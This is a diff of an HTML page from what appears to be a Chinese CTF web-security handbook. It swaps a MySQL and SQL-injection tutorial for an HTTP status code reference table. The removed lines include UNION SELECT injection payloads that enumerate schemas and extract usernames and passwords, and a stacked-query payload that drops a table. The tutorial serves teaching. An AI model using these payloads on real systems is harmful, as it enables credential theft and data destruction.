@@ -9,6 +9,10 @@
       
       
       
+        <link rel="prev" href="../%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/">
+      
+      
+        <link rel="next" href="../http%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94%E6%A0%B7%E4%BE%8B/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -16,7 +20,7 @@
     
     
       
-        <title>ENV 1 Mysql安装 - CTF-Web修炼手册</title>
+        <title>HTTP状态码 - CTF-Web修炼手册</title>
       
     
     
@@ -69,11 +73,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#mysql" class="md-skip">
-          跳转至
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -104,7 +103,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              ENV 1 Mysql安装
+              HTTP状态码
             
           </span>
         </div>
@@ -294,10 +293,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E5%85%A8%E6%99%AF%E5%9B%BE%EF%BC%88%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%EF%BC%89/" class="md-tabs__link">
           
   
@@ -902,28 +903,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
-        
-          
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -936,7 +940,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             Web漏洞基础
@@ -993,10 +997,17 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../http%E7%8A%B6%E6%80%81%E7%A0%81/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1007,6 +1018,7 @@
   
 
       </a>
+      
     </li>
   
 
@@ -1135,116 +1147,6 @@
   
   
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#mysql" class="md-nav__link">
-    <span class="md-ellipsis">
-      一、MySQL 系统表简介
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema" class="md-nav__link">
-    <span class="md-ellipsis">
-      二、information_schema 数据库
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      三、常见的 SQL 注入信息枚举过程
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      四、基于 information_schema 的 SQL 注入示例
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="四、基于 information_schema 的 SQL 注入示例">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      场景
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      注入步骤
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mysql-mysqluser" class="md-nav__link">
-    <span class="md-ellipsis">
-      五、MySQL 用户账户表 (mysql.user)
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="五、MySQL 用户账户表 (mysql.user)">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#mysql_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      示例：列出 MySQL 用户
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ctf-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      六、CTF 中的 SQL 注入技巧
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      七、SQL 注入防护
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
 </nav>
                   </div>
                 </div>
@@ -1262,188 +1164,249 @@
   
 
 
-  <h1>ENV 1 Mysql安装</h1>
+  <h1>HTTP状态码</h1>
 
-<h3 id="mysql">一、MySQL 系统表简介</h3>
-<p>MySQL 的 <strong>系统表</strong> 存储在 <code>information_schema</code> 和 <code>mysql</code> 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。</p>
-<ul>
-<li><code>information_schema</code>: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。</li>
-<li><code>mysql</code>: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。</li>
-</ul>
-<hr />
-<h3 id="information_schema">二、<code>information_schema</code> 数据库</h3>
-<p><code>information_schema</code> 是 MySQL 的元数据表，主要包含以下常用的系统表：</p>
 <table>
 <thead>
 <tr>
-<th>系统表</th>
-<th>描述</th>
+<th>状态码</th>
+<th>名称</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>TABLES</code></td>
-<td>存储所有数据库中表的信息，如表名、表类型等。</td>
+<td>1xx****</td>
+<td><strong>信息性状态码</strong></td>
+<td><strong>请求已接收，服务器正在处理。</strong></td>
 </tr>
 <tr>
-<td><code>COLUMNS</code></td>
-<td>存储所有数据库中列的信息，如列名、数据类型等。</td>
+<td>100</td>
+<td>Continue</td>
+<td>请求已接收，客户端应继续发送请求的其余部分。</td>
 </tr>
 <tr>
-<td><code>SCHEMATA</code></td>
-<td>存储所有数据库的名称。</td>
+<td>101</td>
+<td>Switching Protocols</td>
+<td>服务器理解请求并准备切换协议（如从 HTTP/1.1 到  HTTP/2 或 WebSocket）。</td>
 </tr>
 <tr>
-<td><code>KEY_COLUMN_USAGE</code></td>
-<td>存储主键、外键等约束信息。</td>
+<td><strong>2xx</strong></td>
+<td><strong>成功状态码</strong></td>
+<td><strong>请求已成功被服务器接收、理解并处理。</strong></td>
 </tr>
 <tr>
-<td><code>USER_PRIVILEGES</code></td>
-<td>存储用户权限信息。</td>
+<td>200</td>
+<td>OK</td>
+<td>请求成功，通常与 GET 或 POST 请求一起使用。</td>
 </tr>
 <tr>
-<td><code>CHARACTER_SETS</code></td>
-<td>存储 MySQL 支持的字符集信息。</td>
+<td>201</td>
+<td>Created</td>
+<td>请求成功并且服务器创建了新的资源。</td>
 </tr>
 <tr>
-<td><code>COLLATIONS</code></td>
-<td>存储排序规则相关信息。</td>
+<td>202</td>
+<td>Accepted</td>
+<td>请求已接受，但服务器尚未处理。</td>
+</tr>
+<tr>
+<td>203</td>
+<td>Non-Authoritative Info</td>
+<td>请求成功，返回的数据来自缓存或代理服务器，而非原始服务器。</td>
+</tr>
+<tr>
+<td>204</td>
+<td>No Content</td>
+<td>请求成功，但没有返回任何内容。</td>
+</tr>
+<tr>
+<td>205</td>
+<td>Reset Content</td>
+<td>请求成功，要求客户端重置视图（如清空表单输入）。</td>
+</tr>
+<tr>
+<td>206</td>
+<td>Partial Content</td>
+<td>请求成功，返回部分资源，通常用于范围请求。</td>
+</tr>
+<tr>
+<td>3xx****</td>
+<td><strong>重定向状态码</strong></td>
+<td><strong>客户端需要进一步操作才能完成请求，通常是重定向或提供其他资源位置。</strong></td>
+</tr>
+<tr>
+<td>300</td>
+<td>Multiple Choices</td>
+<td>请求有多种选择，客户端可以选择一个响应。</td>
+</tr>
+<tr>
+<td>301</td>
+<td>Moved Permanently</td>
+<td>请求的资源已被永久移动到新 URL。</td>
+</tr>
+<tr>
+<td>302</td>
+<td>Found</td>
+<td>请求的资源临时移动到新位置，客户端应继续使用原始 URL。</td>
+</tr>
+<tr>
+<td>303</td>
+<td>See Other</td>
+<td>客户端应使用另一个 URL 获取请求的资源，通常在 POST  请求后重定向至 GET 请求。</td>
+</tr>
+<tr>
+<td>304</td>
+<td>Not Modified</td>
+<td>资源未被修改，客户端可以使用缓存的资源。</td>
+</tr>
+<tr>
+<td>305</td>
+<td>Use Proxy</td>
+<td>请求应通过指定的代理服务器访问资源（该状态码已不推荐使用）。</td>
+</tr>
+<tr>
+<td>307</td>
+<td>Temporary Redirect</td>
+<td>临时重定向，客户端应使用原请求方法，保持方法不变。</td>
+</tr>
+<tr>
+<td>308</td>
+<td>Permanent Redirect</td>
+<td>永久重定向，客户端应使用新 URL，保持请求方法不变。</td>
+</tr>
+<tr>
+<td><strong>4xx</strong></td>
+<td><strong>客户端错误状态码</strong></td>
+<td><strong>客户端的请求存在问题，通常是请求无效或缺少必要参数。</strong></td>
+</tr>
+<tr>
+<td>400</td>
+<td>Bad Request</td>
+<td>请求无效，服务器无法理解请求格式。</td>
+</tr>
+<tr>
+<td>401</td>
+<td>Unauthorized</td>
+<td>请求未经授权，需提供身份认证信息。</td>
+</tr>
+<tr>
+<td>402</td>
+<td>Payment Required</td>
+<td>请求需要支付费用，通常是预留给需要付费的服务（已不常用）。</td>
+</tr>
+<tr>
+<td>403</td>
+<td>Forbidden</td>
+<td>服务器理解请求，但拒绝执行。客户端没有权限访问该资源。</td>
+</tr>
+<tr>
+<td>404</td>
+<td>Not Found</td>
+<td>请求的资源未找到。</td>
+</tr>
+<tr>
+<td>405</td>
+<td>Method Not Allowed</td>
+<td>请求方法不被允许，通常是请求方法不支持该资源（如 POST  请求某个只允许 GET 的资源）。</td>
+</tr>
+<tr>
+<td>406</td>
+<td>Not Acceptable</td>
+<td>请求的资源类型不被接受。</td>
+</tr>
+<tr>
+<td>407</td>
+<td>Proxy Authentication Required</td>
+<td>需要通过代理服务器进行身份验证。</td>
+</tr>
+<tr>
+<td>408</td>
+<td>Request Timeout</td>
+<td>请求超时，客户端未在服务器规定的时间内完成请求。</td>
+</tr>
+<tr>
+<td>409</td>
+<td>Conflict</td>
+<td>请求与服务器的当前状态发生冲突。</td>
+</tr>
+<tr>
+<td>410</td>
+<td>Gone</td>
+<td>请求的资源已永久删除，不再可用。</td>
+</tr>
+<tr>
+<td>411</td>
+<td>Length Required</td>
+<td>请求头中缺少 Content-Length 参数。</td>
+</tr>
+<tr>
+<td>412</td>
+<td>Precondition Failed</td>
+<td>请求的先决条件失败（如请求头的 If-Modified-Since 失败）。</td>
+</tr>
+<tr>
+<td>413</td>
+<td>Payload Too Large</td>
+<td>请求体过大，服务器无法处理。</td>
+</tr>
+<tr>
+<td>414</td>
+<td>URI Too Long</td>
+<td>请求的 URL 过长，服务器无法处理。</td>
+</tr>
+<tr>
+<td>415</td>
+<td>Unsupported Media Type</td>
+<td>请求的媒体类型不被支持。</td>
+</tr>
+<tr>
+<td>416</td>
+<td>Range Not Satisfiable</td>
+<td>请求的资源部分不可用，超出了服务器支持的范围。</td>
+</tr>
+<tr>
+<td>417</td>
+<td>Expectation Failed</td>
+<td>服务器无法满足请求头中的 Expect 期望值。</td>
+</tr>
+<tr>
+<td><strong>5xx</strong>****</td>
+<td><strong>服务器错误状态码</strong></td>
+<td><strong>服务器未能完成有效请求，通常是服务器本身存在问题。</strong></td>
+</tr>
+<tr>
+<td>500</td>
+<td>Internal Server Error</td>
+<td>服务器内部错误，无法完成请求。</td>
+</tr>
+<tr>
+<td>501</td>
+<td>Not Implemented</td>
+<td>服务器不支持请求的功能或方法。</td>
+</tr>
+<tr>
+<td>502</td>
+<td>Bad Gateway</td>
+<td>服务器作为网关或代理时，接收到无效的响应。</td>
+</tr>
+<tr>
+<td>503</td>
+<td>Service Unavailable</td>
+<td>服务器当前不可用，通常由于过载或停机维护。</td>
+</tr>
+<tr>
+<td>504</td>
+<td>Gateway Timeout</td>
+<td>作为网关或代理的服务器没有及时从上游服务器收到响应。</td>
+</tr>
+<tr>
+<td>505</td>
+<td>HTTP Version Not Supported</td>
+<td>服务器不支持请求中所使用的 HTTP 协议版本。</td>
 </tr>
 </tbody>
 </table>
-<hr />
-<h3 id="sql">三、常见的 SQL 注入信息枚举过程</h3>
-<p>通过 <strong>SQL 注入</strong> 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：</p>
-<p><strong>获取数据库名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>SELECT schema_name FROM information_schema.schemata;
-</code></pre></div>
-<ul>
-<li>获取当前 MySQL 实例中所有数据库的名称。</li>
-</ul>
-<p><strong>获取表名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39;;
-</code></pre></div>
-<ul>
-<li>查询某个数据库 (<code>table_schema</code>) 中的所有表名。</li>
-</ul>
-<p><strong>获取列名称</strong></p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>SELECT column_name FROM information_schema.columns WHERE table_name=&#39;目标表&#39; AND table_schema=&#39;目标数据库&#39;;
-</code></pre></div>
-<ul>
-<li>查询某个表中的所有列名。</li>
-</ul>
-<p><strong>获取表的数据</strong> 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT login_name, login_passwd FROM lesson_user;
-</code></pre></div>
-<hr />
-<h3 id="information_schema-sql">四、基于 <code>information_schema</code> 的 SQL 注入示例</h3>
-<p>假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。</p>
-<h4 id="_1">场景</h4>
-<p>网站存在以下查询：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;
-</code></pre></div>
-<p>攻击者可以通过修改输入来进行 SQL 注入。</p>
-<h4 id="_2">注入步骤</h4>
-<p><strong>获取数据库名称</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&#39; OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
-</code></pre></div>
-<ul>
-<li>解释：通过 <code>UNION SELECT</code> 合并查询，列出所有数据库名称。</li>
-</ul>
-<p><strong>获取表名</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=&#39;目标数据库&#39; #
-</code></pre></div>
-<ul>
-<li>解释：查询特定数据库中的所有表。</li>
-</ul>
-<p><strong>获取列名</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&#39; OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#39;users&#39; #
-</code></pre></div>
-<ul>
-<li>解释：查询特定表中的所有列名。</li>
-</ul>
-<p><strong>获取敏感数据</strong></p>
-<ul>
-<li>注入 Payload：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; OR 1=1 UNION SELECT username, password FROM users #
-</code></pre></div>
-<ul>
-<li>解释：获取 <code>users</code> 表中的用户名和密码。</li>
-</ul>
-<hr />
-<h3 id="mysql-mysqluser">五、MySQL 用户账户表 (<code>mysql.user</code>)</h3>
-<p><code>mysql.user</code> 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。</p>
-<table>
-<thead>
-<tr>
-<th>列名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>Host</code></td>
-<td>用户允许登录的主机。</td>
-</tr>
-<tr>
-<td><code>User</code></td>
-<td>用户名。</td>
-</tr>
-<tr>
-<td><code>Password</code></td>
-<td>用户密码（MySQL 8.0 之前存储为 <code>authentication_string</code>）。</td>
-</tr>
-<tr>
-<td><code>Select_priv</code></td>
-<td>是否有 <code>SELECT</code> 权限。</td>
-</tr>
-<tr>
-<td><code>Insert_priv</code></td>
-<td>是否有 <code>INSERT</code> 权限。</td>
-</tr>
-<tr>
-<td>...</td>
-<td>其他权限字段，如 <code>UPDATE</code>, <code>DELETE</code> 等。</td>
-</tr>
-</tbody>
-</table>
-<p>通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。</p>
-<h4 id="mysql_1">示例：列出 MySQL 用户</h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SELECT user, host FROM mysql.user;
-</code></pre></div>
-<hr />
-<h3 id="ctf-sql">六、CTF 中的 SQL 注入技巧</h3>
-<ul>
-<li>
-<p><strong>盲注</strong>：当页面没有明显返回查询结果时，可以通过布尔盲注和时间盲注推测信息。</p>
-</li>
-<li>
-<p><strong>基于 <code>UNION</code> 的注入</strong>：用于获取多个表的结果，特别是当页面返回数据时。</p>
-</li>
-<li>
-<p>堆叠查询</p>
-</li>
-</ul>
-<p>（仅限某些数据库支持）：在一条语句中执行多个查询。</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&#39; OR 1=1; DROP TABLE lesson_user; #
-</code></pre></div>
-<h3 id="sql_1">七、SQL 注入防护</h3>
-<ol>
-<li><strong>使用预处理语句 (Prepared Statements)</strong>：防止 SQL 注入。</li>
-<li><strong>输入验证</strong>：对用户输入进行过滤和验证，防止恶意字符注入。</li>
-<li><strong>最小权限原则</strong>：限制数据库用户的权限，防止数据被恶意篡改。</li>
-<li><strong>隐藏系统信息</strong>：避免将错误信息直接暴露给用户，防止信息泄露。</li>
-</ol>
 
 
 
